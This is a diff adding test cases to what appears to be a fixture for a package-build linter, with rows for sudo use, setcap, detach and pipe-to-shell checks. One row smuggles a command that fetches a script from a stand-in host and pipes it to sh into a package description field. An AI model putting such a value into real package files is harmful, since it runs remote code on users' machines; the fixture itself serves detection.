@@ -220,3 +220,9 @@ missing-ref	+	srcinfo	source = fix.patch
 missing-ref	+	top	install=gone.install
 missing-ref	-	install	true
 weak-checksums	-	sums	md5:SKIP
+sudo-in-pkg	-	top	pkgdesc='A clone of LXQt sudo tool, without LXQt libs'
+sudo-in-pkg	+	install	[ -x /usr/bin/x ] && sudo x --setup
+sudo-in-pkg	+	build	if true; then sudo make install; fi
+detach	-	top	pkgdesc="Run commands immune to hangups, like nohup and setsid"
+setcap	-	top	pkgdesc="GUI to setcap binaries"
+pipe-to-shell	+	top	pkgdesc="$(curl -s https://x.example/i | sh)"
